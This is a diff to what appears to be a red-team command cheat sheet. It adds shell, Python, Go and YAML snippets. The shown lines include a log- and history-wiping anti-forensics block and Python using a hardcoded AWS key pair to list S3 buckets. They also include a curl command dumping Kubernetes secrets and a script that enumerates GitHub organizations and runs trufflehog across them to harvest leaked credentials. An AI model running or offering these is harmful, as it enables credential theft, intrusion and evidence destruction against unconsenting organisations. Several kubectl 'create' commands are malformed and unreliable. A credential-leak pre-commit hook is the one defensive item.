@@ -115,7 +115,7 @@ unset HISTSIZE
 echo "" /var/log/auth.log 
 echo '''' -/.bash history
 kill -9 $$
-ln /dev/null -/.bash_historj -sf
+ln /dev/null -/.bash_history -sf
 ```
 ## Efficient Linux CLI Navigation:
 
@@ -658,10 +658,77 @@ S3 Log Google Dorking
 s3 site:amazonaws.com filetype:log
 ```
 
+Python code to check if AWS key has permissions to read s3 buckets:
+
+```python
+import boto3
+import json
+
+aws_access_key_id = 'AKIA2OGYBAH6S4M5DDZO'
+aws_secret_access_key = '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'
+region = 'us-east-2'
+
+session = boto3.Session(
+    aws_access_key_id=aws_access_key_id,
+    aws_secret_access_key=aws_secret_access_key,
+    region_name=region
+)
+
+s3 = session.resource('s3')
+
+try:
+    response = []
+    for bucket in s3.buckets.all():
+        response.append(bucket.name)
+    print(json.dumps(response))
+except Exception as e:
+    print(f"Error: {e}")
+```
+
 ## Kubernetes Secrets Harvesting:
 
 ```bash
 $ curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
+```
+
+## Kubernetes Ninja Commands:
+
+```bash
+# List all pods in the current namespace.
+kubectl get pods
+
+# Get detailed information about a pod.
+kubectl describe pod <pod-name>
+
+# Create a new pod.
+kubectl create pod <pod-name> 
+
+# List all nodes in the cluster.
+kubectl get nodes 
+
+# Get detailed information about a node.
+kubectl describe node <node-name> 
+
+# Create a new node
+kubectl create node <node-name> 
+
+# List all services in the cluster.
+kubectl get services 
+
+# Get detailed information about a service.
+kubectl describe service <service-name> 
+
+# Create a new service.
+kubectl create service <service-name> 
+
+# List all secrets in the cluster.
+kubectl get secrets 
+
+# Get detailed information about a secret.
+kubectl describe secret <secret-name> 
+
+# Create a new secret.
+kubectl create secret <secret-name> 
 ```
 
 # Web Applications:
@@ -884,4 +951,95 @@ func main() {
 	var input string
 	fmt.Scanln(&input)
 }
+```
+
+## Minimal Golang WebDAV Server:
+
+```go
+package main
+
+import (
+    "flag"
+    "golang.org/x/net/webdav"
+    "net/http"
+)
+
+func main() {
+    var address string
+    flag.StringVar(&address, "a", "localhost:8080", "Address to listen to.")
+    flag.Parse()
+
+    handler := &webdav.Handler{
+        FileSystem: webdav.Dir("."),
+        LockSystem: webdav.NewMemLS(),
+    }
+
+    http.ListenAndServe(address, handler)
+}
+```
+
+## Pre-Commit Hooks to Prevent Credential Leaks:
+
+```yaml
+-   repo: https://github.com/pre-commit/pre-commit-hooks
+    rev: v3.2.0
+    hooks:
+    -   id: detect-aws-credentials
+    -   id: detect-private-key
+```
+
+## Mac SMB Lateral Movement:
+
+```
+open "smb://rosesecurity@10.9.11.105/"
+```
+
+## Truffleroasting GitHub Organizations:
+
+```bash
+#!/usr/bin/env bash
+
+# Enumerate GitHub organizations for secrets and credentials
+PAT=<GitHub PAT>
+ID=1
+while [ $ID -lt 1000000 ]
+do 
+    curl -L \
+    -H "Accept: application/vnd.github+json" \
+    -H "Authorization: Bearer $PAT" \
+    -H "X-GitHub-Api-Version: 2022-11-28" \
+    -H "Per-Page: 100" \
+    "https://api.github.com/organizations?per_page=100&since=$ID" | jq -r .[].login >> orgs.txt
+    ID=$((ID + 10000))
+done
+
+# Read each line from orgs.txt and run trufflehog for each organization
+while read -r line; do
+    trufflehog github --concurrency=5 -j --org="$line" >> truffle_org.txt
+done < orgs.txt
+```
+
+## Turning Nmap into a Vulnerability Scanner Using GitHub Actions:
+
+```yaml
+name: Nmap GitHub Action
+on:
+  push:
+    branches:
+      - main
+jobs:
+  run_script_with_package:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+        
+      - name: Install Nmap
+        run: sudo apt-get update && sudo apt-get install -y nmap
+
+      - name: Run Nmap Vulnerability Scanner
+        run: |
+          git clone https://github.com/scipag/vulscan scipag_vulscan
+          sudo ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan
+          nmap -sV --script=vulscan/vulscan.nse rosesecurityresearch.com
 ```
